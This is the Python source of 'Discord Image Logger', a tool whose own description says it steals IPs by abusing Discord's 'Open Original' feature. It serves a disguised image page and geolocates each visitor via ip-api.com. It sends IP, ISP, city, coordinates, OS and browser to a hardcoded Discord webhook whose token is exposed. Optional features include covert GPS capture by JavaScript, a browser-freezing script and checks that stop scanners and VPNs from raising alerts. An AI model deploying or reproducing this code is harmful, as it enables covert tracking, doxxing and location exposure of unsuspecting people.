# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1382023472703733870/WZPM7vB5jGBInAHbdDJmU7ayB3PUWHPowrW5eftnoSUsteN97gSfCeeEtQYo0CbzmnVd",
    "image": "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAkGBxMTEhUSEhMVFhUXFxUWFRUVFxUXFhcVFRUWFhUXFRUYHiggGBolGxUVITEhJSkrLi4uFx8zODMtNygtLisBCgoKDg0OGhAQGi0lHx0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLf/AABEIAOAA4QMBIgACEQEDEQH/xAAbAAACAgMBAAAAAAAAAAAAAAAEBQMGAQIHAP/EAD0QAAEDAgQDBgQDBwQCAwAAAAEAAhEDIQQSMUEFUWEGEyJxgZEUMqGxwdHwByNCUpLh8WJygqIVUxYz0v/EABgBAAMBAQAAAAAAAAAAAAAAAAABAgME/8QAIhEAAgICAgMAAwEAAAAAAAAAAAECESExAxITQVEiMnEE/9oADAMBAAIRAxEAPwCo9oaJDSq5hSCbqz9oflPkqiiDtEcipm2MjNZNuzTJcEicVYeyx8QTloUdluOHW/wymYQihCzTN2iv42iQEu74gqxcQiFXsQLq0Q0TUMXCbU68qvAo/BYgTBUyVji6GLjote81RlINIC1rYYQYWLVGylYNmWS6wW4p39Fh9GwSwMja9ZgXQ7mESsg6oFYc1w+iiqRAQ3eGyzmc6A0EnkFcYsmUjRgBPqm9ClIS2nw2sLkN/wBocCfLkTE2HJNMO8iVraejOq2bPom60fRKK71ezj6JUAF3ZWzaUIs1Ao6lcBMAPGTCQPrEFPMViAQkFYCU0Jm7saVF8YVE5iy2mnQrJPjHLyxkWUUgtm/aCn4D5KoMKu3aAeA+SpWimGhclWRPCedmB4gkT0+7MHxeqctCjsvDaamZTKg7wc1NTrjmslZ0SoGx9AwkVamZhPcVigQUlrP8S1RkyTAYcAF7gCAYAOhJkweY/sjX926Dlp5dwAGnrDhf3nqEOZLWBsmS49CZj7BMKOGLRLnR0kfUkfisZtt4NYpJCjEZ6ZBaczCYB3B/lcNj91kcWMQUQ8Gn/BmYRDmhwd4b3YYBEWOlo9w8VgyDzBAc0/zNOh/W4KqErwyZxrKJ6HEwTdHNxrYCTs4a7VbDDEaquqIth2JxAgqBlWSoalLVepgymoIHJhBfoi2vA/dhwBgZzMRJnKPaLboKzAajtGjwjm8/KPLf25ojheHd85IHU3+gbr6rPkfpGnGsWw3GB8SbcjER5H6/mjKNYPaKhiXfNH84+b3sfVQYp1PKfFlMbRB6QYhBPJbQlpkCpYjq28+wUxWSpL8bGr3tUb6oSEYtx3RNNxPst+pjYZUrdULVqnmtHFQ3KdCshe8qEtKIfQK9SwxKYgQsXk0bg+iycJ0SsdCuV5NPg15FhRX+JYoubqq+GkmE4xbhCUh5BkISIk8jFnZ6oW57QteGyx8citv/AJNUDckBRcOdmdJ3VOvRKuyxjFk7rD67uahcyFux6mjWyJr3TqpTRJuFKCE3wFJpCAFmIae7aN7z1En3Q/D8YZh505mE049RhmZurduY3SvAPk5oaD1i/plJWDWTeOho/wAUfSZM+5EeilwLS4mi4zq6kTE5v46ZMm5jmbgdUuxWNcAQWmOhJHqCEDRrVM7SCbEGw2uNdrSEv4MteDLXC3UHoQYII2MoXGYePdD8UxjjkqUDNR9qojV7TYkAQCW76aICvjyW5nVIs4x5Ae9yFvHJi40TVDqFq10X5BCU8eCSM27QJFjNvfT3UmCrnvWvcP3YlwcIh0Wb/wBvsqk6QlG2G4h5zhpFmNvBiXkSdbW5m1gjaFeflMHfxEu/6CPeFXsUHuzG+U3knruDed/ZewNZzflsObjlHudfZc5sHcVouJgl3/PNH9RN1LRqzh3A6B7YM2Jh0/Za/H1XxSz03E/w5cw9HFlkYcJ3dI0XMIdaoHfwkGRb1KF+yKn+gpAunWEAj0STQpxw4TC3ZzImdRCxSoiUaKWi1NFQi2YFAFeFABbUmlTFiAI2MC8+gsaLdhTEyHuV5FZVhMRzrH0oFkgc4qycQNiq88KjNkMJrwbVLCEx4Q6HIEWktC0yBZ72ywSgsyWhOOGNtqkRKKwuKIgJMEMMfRmsx0nKxr3OH8w8MD3v6Ku4mq19QGm0tMwRP4hP63EMuupEC99byOSTsY17yABe4EmZ3bOywd9rOmDVUD4cVC+NvFmAzE5RqQ0nxDfyVmp4JjaYMw/5rQWkfzAxuP1qFJTpNYwOtOt7PBF5B/NK8Q99RxDYAkSCIAJIkA85OnmlsZrxGuGt1uNWgROseWoSV9LvC9zzlDgPlgDvIyg+nhJ2JlM8ZgC0Evva0yIjLmaB5QY0QfBsMWPDHgk1xULIIs5uYAR6hWsGbMfCtb4c0yX5edwbXFiBC34W9wytOjRlA/lcLGY1G/qt8C1ortZUB8Jc4tyxDu7JvGny6dPcfC0vD38ZWVCRqT4g6ZHKQNN4TYIs3C303Tm1O0R4pNvKeX5JNj8DWLn1IysG5AETZojc9NovzR3/AI5wY1zDfQRNiOo3i09JRvD8UG5e9MAGQHEeE6ZhAiYnyhRVFLJV8TTqMiS5rnbaGBaD1091caNNowQBgvZALuj3Alp9YQHassytNMCRcmHTzuTpczcyeSWcPe93hMzrtH61QllMcpYoie66c8LfYIN+F3R2BAESt3o51sYitZROrlQuqhZ7wEKKLs1djIUtLFoGsBK2abKqJcg74hbjFhK3FYIPNPqKxv8AGheSa/NYToMiviGAOWfNVJ4MldF4vUbkMdVz6qLnzSTsmWGQFH8J+ZBPTDgZ8Y80yS0jDGAYWWUeibUqoyhRuISs0oVupKfDYWYUlajupMPig2EnlAgHjWHILbR1/BDcOw2R4qH05ec80y43Vzs03Btqs8KpteWtNtjP4j+6zeEaw2EfFPq3NgIMxrp00gqWnhXw1zQS0EW8IkT4gQLnnrCkxdWjTe0PeGwbNm56RvyhKOIdsq1Z5p4eixrWktDn623iwaBdJZKeNh/7RqGVlKoGlgcQJkEA9cvT8k8w/AQ9uHc2M7HMcDvBABVMxPaitTJpYgUa9KQXGjJAIOt7Eg7fXZdG7LYsPqUXAgscAWkRERIhGeyTJtUVrtDwB9OrVqRYte1o08dXedNJ9ljiXDmjhwA1Y1rhln5hB97lXvtxShkt1cWknqLD8PZc94lxJ+Govc+4JgN5uOjeo/unyYeBRaoecMw7vgKUjxOAdsIzDw630vCxV4BlYHiHDQ2EtNtD6D6rnNTi1VwD34qr3zictJjcjGt3PeTJtFgPVNeznHsd8Q2iKveB7XHLVgyWjTPE6EIaHGSHzuHOymQ5zACDPygGwkWndAikxjhTY0i0Qb+xRQ7R4ljnU6+FDAbFwdO0TYQVihTBeHGPxRFDnoArEtMLSiXFE8TePqocDWC1bwY1kjqMco2ucEze4KPIFKkOgXMSpKbVMWhbBV2QqISFh2inehqjoTtCo9K8tO9C8nYGvEsN4TdUSuPEfNXzimIsQqLX+Y+ay4w5NkTimHBPnS5yZcD+dW9ELZe6REC3JTU2AodosFNRJCyR0MkxBACBpYfMZW+Mqm61wFYrT0R7CMfhv3TgOSqXxJbAYTmcbbxzJHorjiml7SIv5x+BVUwvD3d8S5swbNH36hZspFk7I4TDd7mrNz1bHM8SR1E7+SUca4e7DYqox1m1HGpRefle11y0H+YGbLHEqL2EPHhE2IEfoJtwvtH4O6qhrxaadRoczoAHWBMzayWynnBT2tbSovzRJc6BqSSdAOa6H+x+sXUu5fZzHSwHXKb/AEJITrhfDMK5s0cJSpvI1psaHX5bjyTfsn2WGGqvxFSz32YwEwxvI7F35qoJtg0oodcUwfeMAOxC5J+1rDOa2hSY2TnLnAbwIAHuu3Oqt3VZ7XdmW4ksr0x+9p6CYDmyJB62+q0avRKxs4O3KTTzSx4/hc1wdfk2JKu/ZXgzqVT4/EsNKnTaRQbU8L6jnavyOgtboADfor/iqlSjRBDcm0uBJafxXKu0faF9UlgeTBPikOPkQLg66rKn7KqK0NH8a+JqlpAi4G8gSdQNEqoYrwnWWuLZ0BANplQdnMdTpOuTOhLh9im+Pptc0vYLE8oRHdCbwI62IzKXCWQVQw71TPCtkLSWiFsn71eD0LUBBUgWJoFB6mASzvCFKzFQgAwhC4xSGvIQGJrKo3YpVRHJXlHnXlsZjri2FBaYXO8UyHkdV0fHYjwlc8xhl7vNTEUwYpjwN0PS4hEYBxDrKmQdHYbCOSLw4kKt4DHusEbxPiXdM6nRYtZOhPBtxV8Tskru0ApiGiSlVbiNSqfG5Avok39JNh7lWSNndp6zjqAOib5XuYKrCZIgm/roqjSYydS49LD+p1/+q6P2drsfQa3cWG5/JKStAnQgpNfMuqF3SBHrumvBuD97VYG+FsyQC4T6ix9U4p8JdMtcR1AaPqIT3guENNwNR8yRY5jPnOn081EU7ByRdOB4BtJgsASscdxopMzEHLN3DYLQcRtZzT0i3+Eu4jxIFpDspaRpqFs5YwTFq7YO3tFRcMweCDyMo7s3x9tdxFPxNaPE+fDOwHM6/Rcl47Qy1gykRldNhIF7uB9Fcuz+Lbh6baVMxzIBueazUmmdPLPj64Oi4hjajSD9FyHtD2aays6Hht985dHKGtgLoFDisx4nmdrD/KXcTy1HyRyubjlci/1VTdo5booeG7PAuEx1Ibc+pAhHcXZTYwNBFuWv3hWx2ByUy8WPPUexP4qgcazEuIObpfMP+Jv7SEoxoabYixQbmsd9xb6Epjw8wNQfp94SOo+6kp1ynJlJMsGJaEI6rFl7C1TEbfT2UWLHJZtGibPOqStHLXCsJKLr0ICAyDuqQEHUqSpMQ5A5lpFGcgjOvIeV5USWXiYBBhUHFM8Z81cMTxFtwqxVpZ3mNSVMVQcj+GMJgHVB4U4wHAnNGY68kVwjAvplunkrBi67A3nzCrYRj9Edap3Z+W6WY+o+o6+yNxdVubwoF1IzOqg0AHMaDMSR7f3/AFqh8XUzR9uXkNkXjiJgIJtMkwLdToANSSmJm2GoE6C8EmbQBuSdAuhdlqbKdMGBI+dzrNB5BpuT0PPQKiUas+EEhrYJO5Ox/wB2sDRut4JNiwjHVAGkgAm1/CB0G/61KBF/o4vvPlNv5rbcuQRVKlBhtyef3PIffU8kFw6gykwCcx/1RJPM8gP1N0wc0hp5nX76/XzhDRiz1XEn5Wmw3/mPP1KU8QrVHWBsjot6j2/QKh81m7F2K/U4S5zsxcehOyOw+FeDEymb4K2bGyTDsF4aQBfl/nzkfRM8JTBIPuOun6PpoleGOvl/f8E3wFlcRpj+hh2lmUtEHZcw/aBwQ0DnaCaZ5/wnodvP369Rwr0F2l4U3EUi0ibWk2nrzW+xrBwFxDruP/PcHlUA1/3a+egw6BIOv69wiuIcNNKo5o2kEdOR5oJ2FcRHKS3nGpafv/lZSNo2StxUaKTvMyjw/DydUwpYWFBpVkNCrlUuIxcheqYVQVMMgGqQvr1JQwcmjuHyEOcAVqjFpgWdZRnwR5FeTEFVuFQCUqw1JweQBadVZOK1DlslHfEa2UjayNfjC1g+hKHpHNMlA/FAiP8ACzRJ0B9UFGMQwF4hZqvymQpWU7E9LoKvJgzv9OqQwKqdZChr2bfe58th+PtyRtLCl7iYdAueg3QGJvJ6oEzQk/KNhJ/3ESfYQPQ81ZuEt8bASAYBM8zpMaxOnOZ0CrODABBPrPIXNvJdC7N4IOa2q8XIAj+JxPICwF7n+6BFo4Hh88OiGj1cd/IT05p1UwxPRScOptiGgWG2g/NHVKS0oyYiqUdRy3/D6oSpT0TzEUAAAEtrtus2iGheRdepm5HqpajIUQH0JWbQgygU1wdaNf7JZQHJH0qkaiyqJSH+GqBGPMt0n2KU4GqOSaNqDyW0WUcg7VUCys+dJkCwPsEi1uFZ/wBqbS14cC8g7ADJPV3PVc7HEHBS1kryJFjpC/RSVwAJlVd3FX2jl+vwWr+KPIuUuoeUslPEjdR1MS2dVWBi3c0w4T43eJHUPKOhjGwstxlPol/GMNAlv0STI7qn1ol8pbPiafMLyqfduXkULyFmxGMBSnEVYJMTKIq4MyY0Q1ek4BR2sITt5A2Pj10Vh4JhQYkzvGqr1ds5Vcey1MEACA7/AFBUtmtgHF6WT5RAJP6hIBXFxMeV1Z+1TSJmxHJVWiYBIiZ1KT2NMLZWOQxPWLEjqlWIeXnKBef16pkxjn7hvn+CkfhnGGUqZg7n/wDRCBiltPXmBHuYNvUq49nsZlbkJJFuZOY6D3/UJS3g7m2cyXE739gPxVi4LgHyfDlmJc4W2BgeSAo6FwCuCwG0bdeqdNMpJwmmGgBseZILv6RYe6dtctTJoHxFOATulL6dvO6c1zNvdAYsfQKGKhXXCCi/mmFRqh7n6GFkxUbU/ZFYWtPhdr+rhLi+LHYqSlXmxGmhQhj7Dy0poK3h6qv0KnMrXiPEBSALjY6GY/stIsaRXu12CfiJc/w5SQAdCBpB13VBxnD8pghdU+FbVBe7e/zbbWSHivAyTIEiLmx+v5KXPI58eLRzynggSpKuFDdgrP8A+FEr1XgjTqEdznUkypW5Bb0SZsrNT4CzkiGcJY3ZPuN8iK6WPOpKyzDE/wCFbGYZsaKJ7ANkdxPkRWfgDyWFZc45LyXcnyklPAAahA8R4eCDAVlcwEqKtTAspJUqycxNJweW9VaOzld02uNIWvaLhw/+xmoQXZ/FODoMR1VxZ1xkpIY9pcMSJggKs8Kw2d8bTcfkrzxXx0tLqnYQltQ5bFN7KiWDCcNubAAac9fdE4us2cglzv5QQhquJIAbNzAkfgVq1rGgNGty46OI2DiBN1EmapGtKrWcS0CA2LuMAToB16ao1lLFN8TarBb5XOJDh1HPyhBGqXVGtHhY0TAEa6A+UrajRqOPhGm8TAkQT/q5DksXJmqii39neLGoQxzmsqAXpw18galjmwfS5Vsp1IEz+C5xRptYRaXi4cSM08wdZtsrZguJEt8QzHp+RWkOX0zPk46yhrUJ15/ZLn4jaZQ+KxzndB9VAyuPY/grZzh9UX9vvdaOgPjYj6hAOxgzGDraPooziC2qc25+h0SALxVGfPRD4ZpGqIZiBp9EBjOIBhj19PJFANjVAH6H1UGFoHE1MjXENaQXi1p0G4VR4txuG/NbpcfdWbsAMuHDp+ZznEm2pt+CGyonRsHwqkGgBqgx/AGPBib/AK9FPwysS1MmuVKmVk5TxPgz6LiCDGxQBouP8J9Auw12tOoBUQwlOIyN9lLSOfwZtM5CWQtckroPHuzjXAupC/L8lTsQ1jTlghw1mRf1RRm4OLyAF45KKpRm8ImoR0ErWo6yTI/oL8L5LylzdV5LAY+GaLajyBBJPJDcV4fXaYmIG6tH/mnhuVrabYAggXPl1S+o7MS5ziXG0626p2hOcFrLKVW4bXIJLxHmgsPwusx9gDO8q9OoGQIHmeS3dRabQB5BNMcedr0JhXhmVzSNp1HuqnXbkqG8gny+qv2MbbLqJt1Vf4vhSWOBsbRA/FPtezWPNmqFtKsCCWmHRY8ggRjHmWg7RP8AETueiGLKjD4g7k2xiFjBYxodcRBFiPuk0dSkXHs9ww1qhYBrreZtuPWfXougcO7JuaQHlmTWGzJO86XVU7A45ocX5bEkZ4JkwDGaIGo0XQ6/FmtyEnVwaPN32UuK2X3ekEDguFbrSYTa5uTBm5OqNFGmRlygDlAhCVqstN4Ox5Fa08dnY1zCNfECNQJDgORB+3VK3YiTGcJpVGluUNPMCCCub8Sp9w99NxuDHnOhXSPi2uGvqDy3/XVUH9pFYOY00wXVGuLS0CSQLz0VpmcituxwD5Ok/Yi/0UL+PZ3tJOsj2IhKTg672SGEbguhtvUoXE8BxFnUxmG8kC+vNIz7x+lnr8WDZynxN+o2VY4zxlzryQeW2uynwnBsU6zgGxaS4XvAtup8V2HrkkSHWzAtBNoknoAnaDvFeyn1uIF7gNBN11HsFx4FzaO2w8lVG/s+qEZhUgxIGU+L12315Ing/ZPEUntqsd8rhZ03j5tBbb3RaBc0PTO94LGtMAHbQIkYo3JXMuDcRxbKpc/DvLSPDEEyNRE/qFZndpGtYc7XjmMpO02IsUWWpr6Wc4sGAZubRsQpTVESqDQ7SvFUjuqgYdHFruu2t4QfFO1OJgilh6hExmiNZ2PIAqSu6+nSKeLHhkgEjRU7ttQ/e52i2UFx8zAKT1ONYlzR+5eCYIMjUaiJ5Sp8TXqVXDvGuaAByM+4KLwc/wDomnHAsqsmBbmtxTJE3zdNJRbKOvhDjEgbAXGpAvrK3axogANgiCD4SHTAykam8JHGm/oB3DuY915F9xR/9jf6nfkvJUV5JfRfSqOFrwSYAAnwjkBrEH8LrYPdsb7xM72K9Sw9Nh8InQ58okAHQunU6yJOi8/Kc2VwvYgMI1uARoOvmmS4sidUAuSYvBAcY0zEQLxKwIOhIFjJmCDEAjaTzhT0ntbJEm0yCYAMATs0GyzRFIm7okwDAygD++6AohFMxmAOYCGi7gQJMnr6IZ1GGhziRt4mka7AGJTelRpy45yBoDNpjebEAfcrFTEg+EAvdGpAixAaZ3sDsngMCIMZEXPV3MeeguAiW0Gm3djwST4Wy1hjxHmJMT5JoaPhBMtMQTve7Y1AhbCm5r5L8pmTLpsBAIHlP05JFJr2J2Aloa1+SZixs4AZiI6CPRa42tjHMDA9khwPUgEGw0mPsmpdnk5y5xBbJzTG4a3QDaygp4FgLi0ySTJcPELaTsByEIsa53HCJcbx7FnMyk2m5p0cHE6xpa62wWMrMoiSGuHM2Li4lxnbXT85WaOFYJJygzd2rnDlJMgaey9TpNdpmiLNEwPrf1nRKxv/AFS0L20sTmluIIBJGXLJAkyG3uRH/YSNUTSwxqfvH1M8geKAZsAMpBAiwM739TaTcpMPyk3EWjS1vVZ7st0iOQ05zHnKMkPmnJZZpUwlMFrWOefE0u5SJ0bpMEFeZYnNIhugvy0FrXiIvPqpe7ZmJb5TuesrfDtZmLS+Sb6b239EEN9mRUaJccjaZyjQwMoOtwJ+i8KVVrs1JxGWQCAyZmZJcMwsBpqCZlF1azqZhj3NaDtYTOqDxToh2afLe/1/unhBajlbGGFxuIa0CtWzl0zkp0mZeQbax0E3m/SFHFuHfEFxrVquU5YY0hgsbtAaYdInXe8bKehJtcidHeEzqDbZa1nEEgxbWPzRZT5ZfScYYAgkky3wkkuJ2sNAYnQKemAABJiDE6c4AjX1tdAhwO5A22CkBcYGfyPS8kpGfZk7ztmIMSCJ22BPtZexFTwkkmSZdbXNDROYx5i+6ipvPKRYag2G19LrBJNgDAI9hc6Jh2ZtTqnwsy25GSddzoNRC1AcHS6pmJLibNvpAgC0Rp5rV9R8y0ZRfe/9lpQa++QnxHz9pSEmwus1xvndAEBoDQLgmSDvrra62JDvmNheYuP9rgLDWyHo4d0xUeR0sZ9dVPAaLR5X+26eSrkgb4cf6vqvIjv2/wDsd/SV5AdmL3ZYa0gX8UC5sNT11UFWq9jQ5sNB2dG/oSTr7oak6Ccp6+EQEVEskMe6o63igNjlKWw2QUXhwcHXJ5+IAEXU9OqNwABvlGgt/CtK8CGGZGobp5It4IaA0eUnSdYCAugF9djSD3cu2i1us6FEYfFuc0FzMszuBvYQpmMaCIudTrAP4ohndgy4ZukdZQkNZ9g5aBmDgYgajQ8raqEUyXWtziLN6TonXGOI0qgEMg6GOSXvrQLCU3Q5pJ4YI+zi0BxAjLoHHncKWrhoAIi8kgXI0jMp8M95bMZSt3Mdz81NxBcb+MCq4Z7gHwOQERCnoNc02m4ggD7FGUXGNVDUxMaap2tilHq8oFBfNmxNhaSeqMc1wjLrGp+qzTOhWfjNQfRMSaAatCq4EsAaTF4vA5KSi1+hvA+aFl+OJ0W9HiESBulgVompYeREk3vyW8i4tbaFC3EEBaUaoJKpNFtp+iYiQLR13QeIeLyYgbbo11QDVakMiSAglpMUPcXNufLmt2OEbgjdNmtZFm3XqNEHUWS6h1Qpa8gWkqfCgf6pOwRL8OJy7KWlRDdEJAkbjAz8s3stauDfSG55EKYl8WK0biHx4zKvBp+NAjA7Uzc7rd1WZkjotq2MtEIJuJaLZVDoxaJu+PJeWfiRyXkDo//Z", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
